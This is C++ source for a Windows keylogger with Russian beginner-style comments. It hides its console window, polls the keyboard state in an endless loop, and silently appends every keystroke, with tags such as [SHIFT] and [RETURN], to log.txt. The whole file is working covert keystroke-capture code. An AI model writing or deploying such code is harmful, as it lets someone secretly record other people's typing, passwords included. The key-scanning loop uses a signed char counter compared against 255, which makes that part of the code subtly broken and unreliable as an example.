#include <iostream>
#include <Windows.h>
#include <cstdio>

using namespace std;

int save(int _key, const char* file);

int main() {
    FreeConsole();
    char i; // объявляем переменную i, которая хранит символ
    while (true) { // бесконечный цикл
        Sleep(10); // небольшое ожидание
        for (i = 8; i <= 255; i++) { // цикл for, где мы перебираем 
            if (GetAsyncKeyState(i) == -32767) { // Если клавиша нажата
                save(i, "log.txt"); // Вызываем функцию save(сохраняет файл)
            }
        }
    }
    return 0; // Возвращаем 0(это нужно писать всегда)
}

int save(int _key, const char* file) {
    cout << _key << endl; // Вывод числа  
    Sleep(10); // ожидание
    FILE* OUTPUT_FILE; // Создаём переменную для записи в файл   
    fopen_s(&OUTPUT_FILE, file, "a+");  // Создаём файл(log.txt)
    // Далее мы смотрим, нажаты ли спец. клавиши и обрабатываем их
    if (_key == VK_SHIFT)
        fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
    else if (_key == VK_BACK)
        fprintf(OUTPUT_FILE, "%s", "[BACK]");
    else if (_key == VK_LBUTTON)
        fprintf(OUTPUT_FILE, "%s", "[LBUTTON]");
    else if (_key == VK_RETURN)
        fprintf(OUTPUT_FILE, "%s", "[RETURN]\n");
    else if (_key == VK_ESCAPE)
        fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
    else // Если ничего не подошло, то просто записываем клавишу
        fprintf(OUTPUT_FILE, "%c", _key);

    fclose(OUTPUT_FILE); // Закрываем файл

    return 0; // Возвращаем 0
}